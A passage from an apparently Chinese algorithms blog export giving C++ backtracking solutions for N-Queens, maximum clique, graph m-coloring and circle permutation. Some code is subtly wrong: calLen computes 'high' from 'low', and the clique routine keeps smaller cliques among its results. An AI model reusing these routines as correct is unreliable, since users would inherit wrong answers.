<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// 存放所有解</span>
    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">chessBoard</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前棋盘状态</span>

    <span class="token comment">// 检查该位置(r,c)是否能够放置棋子</span>
    <span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 从上往下依次检查棋盘第c列是否已放置棋子</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>chessBoard<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// 从下往上依次检查左斜上方是否已放置棋子</span>
            <span class="token keyword">int</span> li <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> lj <span class="token operator">=</span> c <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>li <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> lj <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>li<span class="token punctuation">]</span><span class="token punctuation">[</span>lj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// 从下往上依次检查右斜上方是否已放置棋子</span>
            <span class="token keyword">int</span> ri <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> rj <span class="token operator">=</span> c <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ri <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> rj <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>ri<span class="token punctuation">]</span><span class="token punctuation">[</span>rj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token comment">// 递归搜索函数</span>
    function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大深度，得到一个合法解</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 当前位置不可放置</span>
            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Q'</span><span class="token punctuation">;</span> <span class="token comment">// 放置棋子</span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="最大团问题"><a href="#最大团问题" class="headerlink" title="最大团问题"></a>最大团问题</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/group.png"></p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 图的邻接矩阵形式</span>
<span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点数组（元素为字符类型）</span>
	<span class="token comment">// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> <span class="token function">largestGroup</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 顶点个数</span>
	 <span class="token comment">// 所有的最大团（每个最大团为一个char类型数组，其中元素为最大团顶点）</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> res<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curGroup</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前团</span>
	<span class="token keyword">int</span> maxSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 团的最大顶点数</span>

	<span class="token comment">// 递归搜索函数，idx为搜索深度，curSize为当前搜索状态下团的顶点个数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> curSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度</span>
			<span class="token comment">// 构造最大团</span>
			vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> group<span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					group<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token comment">// 更新最优解</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				res<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				maxSize <span class="token operator">=</span> curSize<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 判断当前结点idx是否能够与当前团的每个结点相连</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 如果相连，则构成一个更大的团，继续向下搜索</span>
			curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 加入团</span>
			<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 剪枝，若满足curSize + n - idx &lt;= maxSize</span>
		<span class="token comment">// 则不可能得到比当前最大团更大的团，无需继续搜索</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">+</span> n <span class="token operator">-</span> idx <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="图的m着色问题"><a href="#图的m着色问题" class="headerlink" title="图的m着色问题"></a>图的m着色问题</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/m.png"></p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 图的邻接矩阵形式</span>
<span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点数组（元素为字符类型）</span>
	<span class="token comment">// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">mColoring</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 图的顶点个数</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// 所有着色方案，若无合法着色方案，则为空</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">coloring</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前着色方案</span>

	<span class="token comment">// 检查所有与顶点idx相连的顶点j是否与顶点idx颜色相同，若相同，则此着色方案不合法</span>
	<span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> coloring<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token comment">// 递归搜索函数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度，将该着色方案加入解集中</span>
			res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>coloring<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 遍历所有颜色，尝试为顶点idx进行着色</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token comment">// 着色</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 此着色合法，继续向下搜索</span>
				<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="圆排列问题"><a href="#圆排列问题" class="headerlink" title="圆排列问题"></a>圆排列问题</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/circle.png"></p>
<h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">double</span> <span class="token function">circlePermutation</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">&amp;</span> radius<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> radius<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 圆的个数</span>
	<span class="token keyword">double</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span> <span class="token comment">// 最小长度</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> optimalPerm<span class="token punctuation">;</span> <span class="token comment">// 最小长度对应的排列方式</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> <span class="token function">curX</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// curX[i]表示当前排列下圆i的圆心横坐标</span>

	<span class="token comment">// 计算当前排列下圆idx的圆心横坐标</span>
	<span class="token keyword">auto</span> calCenter <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">double</span> xMax <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">double</span> x <span class="token operator">=</span> curX<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2.0</span> <span class="token operator">*</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">*</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			xMax <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>xMax<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> xMax<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token comment">// 计算当前排列下的总长度</span>
	<span class="token keyword">auto</span> calLen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">double</span> low <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			low <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			high <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> high <span class="token operator">-</span> low<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token comment">// 递归搜索函数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度</span>
			<span class="token keyword">double</span> len <span class="token operator">=</span> <span class="token function">calLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>
				res <span class="token operator">=</span> len<span class="token punctuation">;</span>
				optimalPerm <span class="token operator">=</span> radius<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 全排列</span>
			<span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">double</span> centerX <span class="token operator">=</span> <span class="token function">calCenter</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>centerX <span class="token operator">+</span> radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 剪枝</span>
				curX<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> centerX<span class="token punctuation">;</span>
				<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 打印最优解对应的圆排列</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> optimalPerm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法分析与设计编程题 贪心算法</title>
